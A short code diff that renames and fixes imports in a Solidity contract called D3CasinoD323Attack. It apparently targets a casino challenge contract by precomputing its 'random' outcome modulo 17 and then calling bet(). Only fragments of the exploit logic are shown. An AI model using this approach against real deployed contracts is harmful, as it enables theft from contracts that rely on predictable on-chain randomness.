@@ -1,11 +1,10 @@
-// contracts/D3Casino.sol
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
-import "./d3casino.sol";
+import "./D3Casino.sol";
 import "@openzeppelin/contracts/proxy/Clones.sol";
 import "hardhat/console.sol";
 
-contract D3CasinoAttack {
+contract D3CasinoD323Attack {
     uint256 public value;
     address public proxyAddress;
 
@@ -25,7 +24,7 @@ contract D3CasinoAttack {
             )
         ) % 17;
         value = rand;
-        D3Casino casino = D3Casino(target);
+        D3CasinoD323 casino = D3CasinoD323(target);
         casino.bet();
     }
 
